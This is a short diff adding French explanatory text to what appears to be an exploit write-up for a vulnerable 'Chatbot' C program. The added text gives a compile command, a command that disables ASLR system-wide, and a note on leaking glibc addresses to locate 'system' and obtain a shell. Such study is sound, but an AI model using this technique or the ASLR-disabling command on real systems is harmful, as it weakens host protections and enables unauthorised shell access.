@@ -161,3 +161,15 @@ s2 = system + "\n" + "/bin/sh\n"
 
 sys.stdout.write(s1 + s2)
 ```
+
+On peut compiler le programme simplement 
+
+`gcc -o Chatbot charbot.c`
+
+Pour que cet exploit marche il faut désactiver l'ASLR qui va changer l'adresse de base de la Glibc à chaque execution.
+
+`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
+
+Si on avait une lecture arbitraire, on pourrait leaker une adresse de la Glibc et ainsi calculer l'offset de 'system' même avec la randomisation des adresses de la Glibc.
+
+on obtient bien un shell:
